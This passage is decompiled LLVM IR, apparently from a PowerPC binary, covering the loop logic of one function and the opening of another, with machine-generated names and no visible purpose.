  store i16 %v1_100053f8, i16* %v4_100053f8, align 2
  %v0_100053fc = load i32, i32* %r9.global-to-local, align 4
  %v1_100053fc = load i32, i32* %r27.global-to-local, align 4
  %v2_100053fc = add i32 %v1_100053fc, %v0_100053fc
  store i32 %v2_100053fc, i32* %r9.global-to-local, align 4
  %v0_10005400 = load i32, i32* %r24.global-to-local, align 4
  %v1_10005400 = trunc i32 %v0_10005400 to i16
  %v2_10005400 = load i32, i32* %r10.global-to-local, align 4
  %v3_10005400 = add i32 %v2_10005400, 2
  %v4_10005400 = inttoptr i32 %v3_10005400 to i16*
  store i16 %v1_10005400, i16* %v4_10005400, align 2
  %v0_10005404 = load i32, i32* %r9.global-to-local, align 4
  %v1_10005404 = add i32 %v0_10005404, 16
  %v2_10005404 = inttoptr i32 %v1_10005404 to i32*
  %v3_10005404 = load i32, i32* %v2_10005404, align 4
  store i32 %v3_10005404, i32* %r0.global-to-local, align 4
  %v1_10005408 = load i32, i32* %r11.global-to-local, align 4
  %v2_10005408 = add i32 %v1_10005408, 16
  %v3_10005408 = inttoptr i32 %v2_10005408 to i32*
  store i32 %v3_10005404, i32* %v3_10005408, align 4
  %v0_1000540c = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_1000540c, i32* %stack_var_-104, align 4
  br i1 %v2_100053f4, label %dec_label_pc_10005390, label %dec_label_pc_10005414

dec_label_pc_10005414:                            ; preds = %dec_label_pc_100055dc, %dec_label_pc_10005390
  %v0_10005414 = load i32, i32* @r30, align 4
  %v3_10005414 = icmp eq i32 %v0_10005414, -1
  store i1 %v3_10005414, i1* %cr2_eq.global-to-local, align 1
  %v0_10005418 = load i32, i32* %r17.global-to-local, align 4
  %v3_10005418 = icmp eq i32 %v0_10005418, 0
  store i1 %v3_10005418, i1* %cr3_eq.global-to-local, align 1
  %v0_1000541c.pre = load i1, i1* %cr4_eq.global-to-local, align 1
  %v1_1000541c.pre = load i1, i1* %cr4_lt.global-to-local, align 1
  br label %dec_label_pc_1000541c.preheader

dec_label_pc_1000541c.preheader:                  ; preds = %dec_label_pc_100054e8, %dec_label_pc_1000566c, %dec_label_pc_10005414
  %v1_1000541c = phi i1 [ %v1_10005364, %dec_label_pc_1000566c ], [ %v1_1000541c.pre, %dec_label_pc_10005414 ], [ %v1_100054e8, %dec_label_pc_100054e8 ]
  %v0_1000541c = phi i1 [ %v3_10005364, %dec_label_pc_1000566c ], [ %v0_1000541c.pre, %dec_label_pc_10005414 ], [ %v0_100054e8, %dec_label_pc_100054e8 ]
  %v2_1000541c = or i1 %v1_1000541c, %v0_1000541c
  br label %dec_label_pc_1000541c

dec_label_pc_1000541c:                            ; preds = %dec_label_pc_1000541c.preheader, %dec_label_pc_1000541c
  br i1 %v2_1000541c, label %dec_label_pc_1000541c, label %dec_label_pc_10005420

dec_label_pc_10005420:                            ; preds = %dec_label_pc_1000541c, %dec_label_pc_100054e8
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  store i32 0, i32* %stack_var_-104, align 4
  store i32 0, i32* @r30, align 4
  br label %dec_label_pc_10005430

dec_label_pc_10005430:                            ; preds = %dec_label_pc_10005478, %dec_label_pc_10005420
  %v0_10005430 = phi i32 [ %v1_100054d8, %dec_label_pc_10005478 ], [ 0, %dec_label_pc_10005420 ]
  %v1_10005430 = mul i32 %v0_10005430, 24
  store i32 %v1_10005430, i32* %r0.global-to-local, align 4
  %v1_10005434 = mul i32 %v0_10005430, 4
  store i32 %v1_10005434, i32* %r11.global-to-local, align 4
  %v1_10005438 = load i32, i32* %r20.global-to-local, align 4
  %v2_10005438 = add i32 %v1_10005438, %v1_10005434
  %v3_10005438 = inttoptr i32 %v2_10005438 to i32*
  %v4_10005438 = load i32, i32* %v3_10005438, align 4
  store i32 %v4_10005438, i32* %r28.global-to-local, align 4
  %v1_1000543c = load i32, i32* %r27.global-to-local, align 4
  %v2_1000543c = add i32 %v1_1000543c, %v1_10005430
  store i32 %v2_1000543c, i32* %r10.global-to-local, align 4
  %v1_10005440 = add i32 %v2_1000543c, 20
  %v2_10005440 = inttoptr i32 %v1_10005440 to i8*
  %v3_10005440 = load i8, i8* %v2_10005440, align 1
  %v4_10005440 = zext i8 %v3_10005440 to i32
  store i32 %v4_10005440, i32* %r9.global-to-local, align 4
  %v1_10005444 = add i32 %v4_10005438, 20
  store i32 %v1_10005444, i32* @r31, align 4
  %tmp32 = icmp ult i8 %v3_10005440, 32
  br i1 %tmp32, label %dec_label_pc_100054f0, label %dec_label_pc_10005450

dec_label_pc_10005450:                            ; preds = %dec_label_pc_10005430
  %v0_10005450 = load i1, i1* %cr2_eq.global-to-local, align 1
  br i1 %v0_10005450, label %dec_label_pc_10005518, label %dec_label_pc_10005454

dec_label_pc_10005454:                            ; preds = %dec_label_pc_100054f0, %dec_label_pc_10005450
  store i32 65535, i32* @r29, align 4
  %v0_1000545c = load i32, i32* %r22.global-to-local, align 4
  %v4_1000545c = icmp eq i32 %v0_1000545c, 65535
  br i1 %v4_1000545c, label %dec_label_pc_10005530, label %dec_label_pc_10005464

dec_label_pc_10005464:                            ; preds = %dec_label_pc_10005518, %dec_label_pc_10005454
  %v1_10005464 = phi i32 [ %v1_10005528, %dec_label_pc_10005518 ], [ 65535, %dec_label_pc_10005454 ]
  %v0_10005464 = load i32, i32* %r23.global-to-local, align 4
  %v4_10005464 = icmp eq i32 %v0_10005464, %v1_10005464
  br i1 %v4_10005464, label %dec_label_pc_10005540, label %dec_label_pc_1000546c

dec_label_pc_1000546c:                            ; preds = %dec_label_pc_10005530.dec_label_pc_1000546c_crit_edge, %dec_label_pc_10005464
  %v1_1000546c = phi i32 [ %v1_1000546c.pre, %dec_label_pc_10005530.dec_label_pc_1000546c_crit_edge ], [ %v1_10005464, %dec_label_pc_10005464 ]
  %v0_1000546c = load i32, i32* %r24.global-to-local, align 4
  %v4_1000546c = icmp eq i32 %v0_1000546c, %v1_1000546c
  br i1 %v4_1000546c, label %dec_label_pc_10005550, label %dec_label_pc_10005474

dec_label_pc_10005474:                            ; preds = %dec_label_pc_10005540, %dec_label_pc_1000546c
  %v0_10005474 = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_10005474, label %dec_label_pc_10005478, label %dec_label_pc_1000555c

dec_label_pc_10005478:                            ; preds = %dec_label_pc_10005474, %dec_label_pc_10005550, %dec_label_pc_1000555c
  %v0_10005478 = load i32, i32* @r30, align 4
  %v1_10005478 = trunc i32 %v0_10005478 to i16
  %v2_10005478 = load i32, i32* %r28.global-to-local, align 4
  %v3_10005478 = add i32 %v2_10005478, 10
  %v4_10005478 = inttoptr i32 %v3_10005478 to i16*
  store i16 %v1_10005478, i16* %v4_10005478, align 2
  %v0_10005480 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10005480, i32* @r3, align 4
  %v2_10005484 = call i32 @function_100060d4(i32 %v0_10005480, i32 20)
  %v3_10005484 = trunc i32 %v2_10005484 to i16
  %v0_10005488 = load i32, i32* @r31, align 4
  store i32 %v0_10005488, i32* @r4, align 4
  %v4_1000548c = add i32 %v0_10005480, 10
  %v5_1000548c = inttoptr i32 %v4_1000548c to i16*
  store i16 %v3_10005484, i16* %v5_1000548c, align 2
  %v0_10005490 = load i32, i32* %r26.global-to-local, align 4
  %v0_10005494 = load i32, i32* @r30, align 4
  %v1_10005494 = trunc i32 %v0_10005494 to i16
  %v2_10005494 = load i32, i32* @r31, align 4
  %v3_10005494 = add i32 %v2_10005494, 6
  %v4_10005494 = inttoptr i32 %v3_10005494 to i16*
  store i16 %v1_10005494, i16* %v4_10005494, align 2
  %v0_10005498 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10005498, i32* %r3.global-to-local, align 4
  %v0_1000549c = load i32, i32* @r31, align 4
  %v1_1000549c = add i32 %v0_1000549c, 4
  %v2_1000549c = inttoptr i32 %v1_1000549c to i16*
  %v3_1000549c = load i16, i16* %v2_1000549c, align 2
  %v4_1000549c = zext i16 %v3_1000549c to i32
  %v4_100054a0 = call i32 @function_10006138(i32 %v0_10005498, i32 %v0_10005488, i32 %v4_1000549c, i32 %v0_10005490)
  %v5_100054a0 = trunc i32 %v4_100054a0 to i16
  store i32 %v4_100054a0, i32* %r3.global-to-local, align 4
  %v3_100054a4 = load i32, i32* %stack_var_-104, align 4
  store i32 %v3_100054a4, i32* %r7.global-to-local, align 4
  %v0_100054a8 = load i32, i32* @r31, align 4
  %v1_100054a8 = add i32 %v0_100054a8, 2
  %v2_100054a8 = inttoptr i32 %v1_100054a8 to i16*
  %v3_100054a8 = load i16, i16* %v2_100054a8, align 2
  %v4_100054a8 = zext i16 %v3_100054a8 to i32
  store i32 %v4_100054a8, i32* %r0.global-to-local, align 4
  %v0_100054ac = load i32, i32* %r28.global-to-local, align 4
  %v1_100054b0 = mul i32 %v3_100054a4, 24
  store i32 %v1_100054b0, i32* %r7.global-to-local, align 4
  %v4_100054b4 = add i32 %v0_100054a8, 6
  %v5_100054b4 = inttoptr i32 %v4_100054b4 to i16*
  store i16 %v5_100054a0, i16* %v5_100054b4, align 2
  %v0_100054b8 = load i32, i32* %r25.global-to-local, align 4
  %v0_100054bc = load i32, i32* %r21.global-to-local, align 4
  store i32 %v0_100054bc, i32* %r3.global-to-local, align 4
  %v0_100054c0 = load i32, i32* %r7.global-to-local, align 4
  %v1_100054c0 = load i32, i32* %r27.global-to-local, align 4
  %v2_100054c0 = add i32 %v1_100054c0, %v0_100054c0
  store i32 %v2_100054c0, i32* %r7.global-to-local, align 4
  %v0_100054c8 = load i32, i32* %r0.global-to-local, align 4
  %v1_100054c8 = trunc i32 %v0_100054c8 to i16
  %v3_100054c8 = add i32 %v2_100054c0, 2
  %v4_100054c8 = inttoptr i32 %v3_100054c8 to i16*
  store i16 %v1_100054c8, i16* %v4_100054c8, align 2
  store i32 268457172, i32* @lr, align 4
  %v6_100054d0 = call i32 @function_1000c140(i32 %v0_100054bc, i32 %v0_100054ac, i32 %v0_100054b8, i32 16384, i32 %v2_100054c0, i32 16)
  store i32 %v6_100054d0, i32* %r3.global-to-local, align 4
  %v3_100054d4 = load i32, i32* %stack_var_-104, align 4
  %v1_100054d8 = add i32 %v3_100054d4, 1
  store i32 %v1_100054d8, i32* %r9.global-to-local, align 4
  %v1_100054dc = load i32, i32* %r19.global-to-local, align 4
  %v2_100054dc = icmp slt i32 %v1_100054d8, %v1_100054dc
  store i32 %v1_100054d8, i32* %stack_var_-104, align 4
  br i1 %v2_100054dc, label %dec_label_pc_10005430, label %dec_label_pc_100054e8

dec_label_pc_100054e8:                            ; preds = %dec_label_pc_10005478
  %v0_100054e8 = load i1, i1* %cr4_eq.global-to-local, align 1
  %v1_100054e8 = load i1, i1* %cr4_lt.global-to-local, align 1
  %v2_100054e8 = or i1 %v0_100054e8, %v1_100054e8
  br i1 %v2_100054e8, label %dec_label_pc_1000541c.preheader, label %dec_label_pc_10005420

dec_label_pc_100054f0:                            ; preds = %dec_label_pc_10005430
  %v1_100054f0 = add i32 %v2_1000543c, 16
  %v2_100054f0 = inttoptr i32 %v1_100054f0 to i32*
  %v3_100054f0 = load i32, i32* %v2_100054f0, align 4
  store i32 %v3_100054f0, i32* %r29.global-to-local, align 4
  %v0_100054f4 = call i32 @function_10007ca8()
  store i32 %v0_100054f4, i32* %r3.global-to-local, align 4
  %v3_100054f8 = load i32, i32* %stack_var_-104, align 4
  %v1_100054fc = mul i32 %v3_100054f8, 24
  %v1_10005500 = load i32, i32* %r27.global-to-local, align 4
  %v2_10005500 = add i32 %v1_10005500, %v1_100054fc
  store i32 %v2_10005500, i32* %r9.global-to-local, align 4
  %v1_10005504 = add i32 %v2_10005500, 20
  %v2_10005504 = inttoptr i32 %v1_10005504 to i8*
  %v3_10005504 = load i8, i8* %v2_10005504, align 1
  %v4_10005504 = zext i8 %v3_10005504 to i32
  store i32 %v4_10005504, i32* %r0.global-to-local, align 4
  %tmp = urem i8 %v3_10005504, 64
  %v2_10005508 = zext i8 %tmp to i32
  %v3_10005508 = lshr i32 %v0_100054f4, %v2_10005508
  store i32 %v3_10005508, i32* %r3.global-to-local, align 4
  %v0_1000550c = load i32, i32* %r29.global-to-local, align 4
  %v2_1000550c = add i32 %v3_10005508, %v0_1000550c
  store i32 %v2_1000550c, i32* %r29.global-to-local, align 4
  %v1_10005510 = load i32, i32* %r28.global-to-local, align 4
  %v2_10005510 = add i32 %v1_10005510, 16
  %v3_10005510 = inttoptr i32 %v2_10005510 to i32*
  store i32 %v2_1000550c, i32* %v3_10005510, align 4
  %v0_10005514 = load i1, i1* %cr2_eq.global-to-local, align 1
  br i1 %v0_10005514, label %dec_label_pc_10005518, label %dec_label_pc_10005454

dec_label_pc_10005518:                            ; preds = %dec_label_pc_100054f0, %dec_label_pc_10005450
  store i32 0, i32* %r29.global-to-local, align 4
  %v0_1000551c = call i32 @function_10007ca8()
  store i32 %v0_1000551c, i32* %r3.global-to-local, align 4
  store i32 65535, i32* @r29, align 4
  %v1_10005524 = load i32, i32* %r28.global-to-local, align 4
  %v2_10005524 = add i32 %v1_10005524, 12
  %v3_10005524 = inttoptr i32 %v2_10005524 to i32*
  store i32 %v0_1000551c, i32* %v3_10005524, align 4
  %v0_10005528 = load i32, i32* %r22.global-to-local, align 4
  %v1_10005528 = load i32, i32* @r29, align 4
  %v4_10005528 = icmp eq i32 %v0_10005528, %v1_10005528
  br i1 %v4_10005528, label %dec_label_pc_10005530, label %dec_label_pc_10005464

dec_label_pc_10005530:                            ; preds = %dec_label_pc_10005518, %dec_label_pc_10005454
  %v0_10005530 = call i32 @function_10007ca8()
  %v1_10005530 = trunc i32 %v0_10005530 to i16
  store i32 %v0_10005530, i32* %r3.global-to-local, align 4
  %v0_10005534 = load i32, i32* %r23.global-to-local, align 4
  %v1_10005534 = load i32, i32* @r29, align 4
  %v4_10005534 = icmp eq i32 %v0_10005534, %v1_10005534
  %v3_10005538 = load i32, i32* %r28.global-to-local, align 4
  %v4_10005538 = add i32 %v3_10005538, 4
  %v5_10005538 = inttoptr i32 %v4_10005538 to i16*
  store i16 %v1_10005530, i16* %v5_10005538, align 2
  br i1 %v4_10005534, label %dec_label_pc_10005540, label %dec_label_pc_10005530.dec_label_pc_1000546c_crit_edge

dec_label_pc_10005530.dec_label_pc_1000546c_crit_edge: ; preds = %dec_label_pc_10005530
  %v1_1000546c.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000546c

dec_label_pc_10005540:                            ; preds = %dec_label_pc_10005530, %dec_label_pc_10005464
  %v0_10005540 = call i32 @function_10007ca8()
  %v1_10005540 = trunc i32 %v0_10005540 to i16
  store i32 %v0_10005540, i32* %r3.global-to-local, align 4
  %v0_10005544 = load i32, i32* %r24.global-to-local, align 4
  %v1_10005544 = load i32, i32* @r29, align 4
  %v4_10005544 = icmp eq i32 %v0_10005544, %v1_10005544
  %v3_10005548 = load i32, i32* %r28.global-to-local, align 4
  %v4_10005548 = add i32 %v3_10005548, 20
  %v5_10005548 = inttoptr i32 %v4_10005548 to i16*
  store i16 %v1_10005540, i16* %v5_10005548, align 2
  br i1 %v4_10005544, label %dec_label_pc_10005550, label %dec_label_pc_10005474

dec_label_pc_10005550:                            ; preds = %dec_label_pc_10005540, %dec_label_pc_1000546c
  %v0_10005550 = call i32 @function_10007ca8()
  %v1_10005550 = trunc i32 %v0_10005550 to i16
  store i32 %v0_10005550, i32* %r3.global-to-local, align 4
  %v3_10005554 = load i32, i32* @r31, align 4
  %v4_10005554 = add i32 %v3_10005554, 2
  %v5_10005554 = inttoptr i32 %v4_10005554 to i16*
  store i16 %v1_10005550, i16* %v5_10005554, align 2
  %v0_10005558 = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_10005558, label %dec_label_pc_10005478, label %dec_label_pc_1000555c

dec_label_pc_1000555c:                            ; preds = %dec_label_pc_10005474, %dec_label_pc_10005550
  %v0_1000555c = load i32, i32* %r28.global-to-local, align 4
  %v1_1000555c = add i32 %v0_1000555c, 28
  store i32 %v1_1000555c, i32* @r3, align 4
  %v0_10005560 = load i32, i32* %r18.global-to-local, align 4
  store i32 %v0_10005560, i32* @r4, align 4
  %v0_10005564 = call i32 @function_10007ed4()
  store i32 %v0_10005564, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10005478

dec_label_pc_1000556c:                            ; preds = %dec_label_pc_10005324
  %v0_1000556c = load i32, i32* %r21.global-to-local, align 4
  store i32 %v0_1000556c, i32* %r3.global-to-local, align 4
  store i32 268457332, i32* @lr, align 4
  %v0_10005570 = call i32 @function_1000b3f0()
  store i32 %v0_10005570, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10005574

dec_label_pc_10005574:                            ; preds = %dec_label_pc_100051a8, %dec_label_pc_1000556c
  store i32 %v0_100051c0, i32* %r0.global-to-local, align 4
  %v1_10005588 = call %0 @__asm_mtcrf(i32 56, i32 %v0_100051b0)
  store i32 %v0_100051f4, i32* %r28.global-to-local, align 4
  store i32 %v0_100051fc, i32* %r29.global-to-local, align 4
  store i32 %v0_10005204, i32* %r30.global-to-local, align 4
  store i32 %v0_10005208, i32* %r31.global-to-local, align 4
  %v0_100055d0 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_100055d0

dec_label_pc_100055d4:                            ; preds = %dec_label_pc_10005374
  store i32 0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100055dc

dec_label_pc_100055dc:                            ; preds = %dec_label_pc_100055dc, %dec_label_pc_100055d4
  store i32 1510, i32* %r3.global-to-local, align 4
  store i32 268457448, i32* @lr, align 4
  %v2_100055e4 = call i32 @function_1000c548(i32 1510, i32 1)
  store i32 %v2_100055e4, i32* %r3.global-to-local, align 4
  %v3_100055e8 = load i32, i32* %stack_var_-104, align 4
  store i32 %v3_100055e8, i32* %r9.global-to-local, align 4
  %v0_100055ec = load i32, i32* @r31, align 4
  %v1_100055ec = mul i32 %v0_100055ec, 4
  store i32 %v1_100055ec, i32* %r0.global-to-local, align 4
  %v1_100055f0 = load i32, i32* %r20.global-to-local, align 4
  %v3_100055f0 = add i32 %v1_100055f0, %v1_100055ec
  %v4_100055f0 = inttoptr i32 %v3_100055f0 to i32*
  store i32 %v2_100055e4, i32* %v4_100055f0, align 4
  %v0_100055f4 = load i32, i32* %r9.global-to-local, align 4
  %v1_100055f4 = mul i32 %v0_100055f4, 4
  store i32 %v1_100055f4, i32* %r9.global-to-local, align 4
  %v1_100055f8 = load i32, i32* %r20.global-to-local, align 4
  %v2_100055f8 = add i32 %v1_100055f8, %v1_100055f4
  %v3_100055f8 = inttoptr i32 %v2_100055f8 to i32*
  %v4_100055f8 = load i32, i32* %v3_100055f8, align 4
  store i32 %v4_100055f8, i32* %r11.global-to-local, align 4
  store i32 5, i32* %r9.global-to-local, align 4
  %v1_10005600 = inttoptr i32 %v4_100055f8 to i32*
  %v2_10005600 = load i32, i32* %v1_10005600, align 4
  store i32 %v2_10005600, i32* %r0.global-to-local, align 4
  %v1_10005604 = add i32 %v4_100055f8, 20
  store i32 %v1_10005604, i32* %r10.global-to-local, align 4
  %v0_10005608 = load i32, i32* %r16.global-to-local, align 4
  %v1_10005608 = trunc i32 %v0_10005608 to i8
  %v3_10005608 = add i32 %v4_100055f8, 8
  %v4_10005608 = inttoptr i32 %v3_10005608 to i8*
  store i8 %v1_10005608, i8* %v4_10005608, align 1
  %v1_1000560c = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_1000560c, i32* %r0.global-to-local, align 4
  %v0_10005610 = load i32, i32* @r30, align 4
  %v1_10005610 = load i32, i32* %r11.global-to-local, align 4
  %v2_10005610 = add i32 %v1_10005610, 12
  %v3_10005610 = inttoptr i32 %v2_10005610 to i32*
  store i32 %v0_10005610, i32* %v3_10005610, align 4
  %v1_10005614 = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  %v0_10005618 = load i32, i32* %r22.global-to-local, align 4
  %v1_10005618 = trunc i32 %v0_10005618 to i16
  %v2_10005618 = load i32, i32* %r11.global-to-local, align 4
  %v3_10005618 = add i32 %v2_10005618, 4
  %v4_10005618 = inttoptr i32 %v3_10005618 to i16*
  store i16 %v1_10005618, i16* %v4_10005618, align 2
  %v1_1000561c = load i32, i32* %r11.global-to-local, align 4
  %v2_1000561c = inttoptr i32 %v1_1000561c to i32*
  store i32 %v1_10005614, i32* %v2_1000561c, align 4
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_10005624 = load i32, i32* %r11.global-to-local, align 4
  %v3_10005624 = add i32 %v2_10005624, 9
  %v4_10005624 = inttoptr i32 %v3_10005624 to i8*
  store i8 17, i8* %v4_10005624, align 1
  %v0_10005628 = load i32, i32* %r15.global-to-local, align 4
  %v1_10005628 = trunc i32 %v0_10005628 to i8
  %v2_10005628 = load i32, i32* %r11.global-to-local, align 4
  %v3_10005628 = add i32 %v2_10005628, 1
  %v4_10005628 = inttoptr i32 %v3_10005628 to i8*
  store i8 %v1_10005628, i8* %v4_10005628, align 1
  %v0_1000562c = load i32, i32* @r28, align 4
  %v1_1000562c = trunc i32 %v0_1000562c to i16
  %v2_1000562c = load i32, i32* %r11.global-to-local, align 4
  %v3_1000562c = add i32 %v2_1000562c, 2
  %v4_1000562c = inttoptr i32 %v3_1000562c to i16*
  store i16 %v1_1000562c, i16* %v4_1000562c, align 2
  %v3_10005630 = load i32, i32* %stack_var_-104, align 4
  store i32 %v3_10005630, i32* %r9.global-to-local, align 4
  %v0_10005634 = load i32, i32* %r23.global-to-local, align 4
  %v1_10005634 = trunc i32 %v0_10005634 to i16
  %v2_10005634 = load i32, i32* %r11.global-to-local, align 4
  %v3_10005634 = add i32 %v2_10005634, 20
  %v4_10005634 = inttoptr i32 %v3_10005634 to i16*
  store i16 %v1_10005634, i16* %v4_10005634, align 2
  %v0_10005638 = load i32, i32* %r9.global-to-local, align 4
  %v1_10005638 = add i32 %v0_10005638, 1
  store i32 %v1_10005638, i32* %r31.global-to-local, align 4
  %v1_1000563c = mul i32 %v0_10005638, 24
  %v1_10005640 = load i32, i32* %r19.global-to-local, align 4
  %v2_10005640 = icmp slt i32 %v1_10005638, %v1_10005640
  %v1_10005644 = load i32, i32* %r27.global-to-local, align 4
  %v2_10005644 = add i32 %v1_10005644, %v1_1000563c
  store i32 %v2_10005644, i32* %r9.global-to-local, align 4
  %v1_10005648 = add i32 %v2_10005644, 16
  %v2_10005648 = inttoptr i32 %v1_10005648 to i32*
  %v3_10005648 = load i32, i32* %v2_10005648, align 4
  store i32 %v3_10005648, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r9.global-to-local, align 4
  %v2_10005650 = load i32, i32* %r11.global-to-local, align 4
  %v3_10005650 = add i32 %v2_10005650, 6
  %v4_10005650 = inttoptr i32 %v3_10005650 to i16*
  store i16 16384, i16* %v4_10005650, align 2
  %v0_10005654 = load i32, i32* %r0.global-to-local, align 4
  %v1_10005654 = load i32, i32* %r11.global-to-local, align 4
  %v2_10005654 = add i32 %v1_10005654, 16
  %v3_10005654 = inttoptr i32 %v2_10005654 to i32*
  store i32 %v0_10005654, i32* %v3_10005654, align 4
  %v0_10005658 = load i32, i32* @r29, align 4
  %v1_10005658 = trunc i32 %v0_10005658 to i16
  %v2_10005658 = load i32, i32* %r10.global-to-local, align 4
  %v3_10005658 = add i32 %v2_10005658, 4
  %v4_10005658 = inttoptr i32 %v3_10005658 to i16*
  store i16 %v1_10005658, i16* %v4_10005658, align 2
  %v0_1000565c = load i32, i32* %r24.global-to-local, align 4
  %v1_1000565c = trunc i32 %v0_1000565c to i16
  %v2_1000565c = load i32, i32* %r10.global-to-local, align 4
  %v3_1000565c = add i32 %v2_1000565c, 2
  %v4_1000565c = inttoptr i32 %v3_1000565c to i16*
  store i16 %v1_1000565c, i16* %v4_1000565c, align 2
  %v0_10005660 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_10005660, i32* %stack_var_-104, align 4
  br i1 %v2_10005640, label %dec_label_pc_100055dc, label %dec_label_pc_10005414

dec_label_pc_1000566c:                            ; preds = %dec_label_pc_10005364
  %v0_1000566c = load i32, i32* %r30.global-to-local, align 4
  %v3_1000566c = icmp eq i32 %v0_1000566c, -1
  store i1 %v3_1000566c, i1* %cr2_eq.global-to-local, align 1
  %v0_10005670 = load i32, i32* %r17.global-to-local, align 4
  %v3_10005670 = icmp eq i32 %v0_10005670, 0
  store i1 %v3_10005670, i1* %cr3_eq.global-to-local, align 1
  %v1_10005674 = add nuw nsw i32 %v0_10005674, 28
  store i32 %v1_10005674, i32* %r25.global-to-local, align 4
  %v1_10005678 = add nuw nsw i32 %v0_10005674, 8
  store i32 %v1_10005678, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_1000541c.preheader

; uselistorder directives
  uselistorder i32 %v1_100055f4, { 1, 0 }
  uselistorder i32 %v1_100055ec, { 1, 0 }
  uselistorder i32 %v0_10005550, { 1, 0 }
  uselistorder i32 %v0_10005540, { 1, 0 }
  uselistorder i32 %v0_10005530, { 1, 0 }
  uselistorder i32 %v1_10005528, { 1, 0 }
  uselistorder i1 %v1_100054e8, { 1, 0 }
  uselistorder i1 %v0_100054e8, { 1, 0 }
  uselistorder i32 %v1_100054d8, { 0, 2, 3, 1 }
  uselistorder i32 %v4_100054a0, { 1, 0 }
  uselistorder i32 %v1_10005434, { 1, 0 }
  uselistorder i32 %v1_100053a8, { 1, 0 }
  uselistorder i32 %v1_100053a0, { 1, 0 }
  uselistorder i32 %v0_10005674, { 1, 0, 3, 2 }
  uselistorder i32 %v1_10005348, { 1, 2, 0 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32* %r30.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 20, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 0, 1 }
  uselistorder i32* %r29.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r28.global-to-local, { 0, 9, 1, 2, 3, 4, 5, 6, 7, 8, 10 }
  uselistorder i32* %r18.global-to-local, { 1, 2, 0 }
  uselistorder i1* %cr4_eq.global-to-local, { 1, 0, 2 }
  uselistorder i32 ()* @function_10007ed4, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 1510, { 0, 5, 1, 6, 2, 7, 3, 8, 4, 9 }
  uselistorder label %dec_label_pc_10005574, { 1, 0 }
  uselistorder label %dec_label_pc_1000555c, { 1, 0 }
  uselistorder label %dec_label_pc_10005478, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10005420, { 1, 0 }
  uselistorder label %dec_label_pc_1000541c, { 1, 0 }
  uselistorder label %dec_label_pc_1000541c.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10005364, { 1, 0 }
}

define i32 @function_10005684(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10005684:
  %cr3_eq.global-to-local = alloca i1, align 1
  %cr4_eq.global-to-local = alloca i1, align 1
  %cr4_lt.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r19.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %v0_10005688 = load i32, i32* @lr, align 4
  store i32 %v0_10005688, i32* %r0.global-to-local, align 4
  %v0_1000568c = call i32 @__asm_mfcr()
  store i32 %v0_1000568c, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r27.global-to-local, align 4
  store i32 %v0_1000568c, i32* %r23.global-to-local, align 4
  %v0_100056c4 = load i32, i32* @r28, align 4
  store i32 %arg4, i32* @r28, align 4
  %v0_100056cc = load i32, i32* @r29, align 4
  store i32 %arg3, i32* @r29, align 4
  %v0_100056d4 = load i32, i32* @r30, align 4
  store i32 268457716, i32* @lr, align 4
  %v2_100056f0 = call i32 @function_1000c548(i32 4, i32 4)
  store i32 %v2_100056f0, i32* %r24.global-to-local, align 4
  %v0_100056f8 = load i32, i32* @r28, align 4
  %v0_100056fc = load i32, i32* @r29, align 4
  store i32 %v0_100056fc, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 268457740, i32* @lr, align 4
  %v4_10005708 = inttoptr i32 %v0_100056f8 to i32*
  %v5_10005708 = call i32 @function_1000235c(i32 %v0_100056fc, i32* %v4_10005708, i32 2, i32 0)
  store i32 65535, i32* %r6.global-to-local, align 4
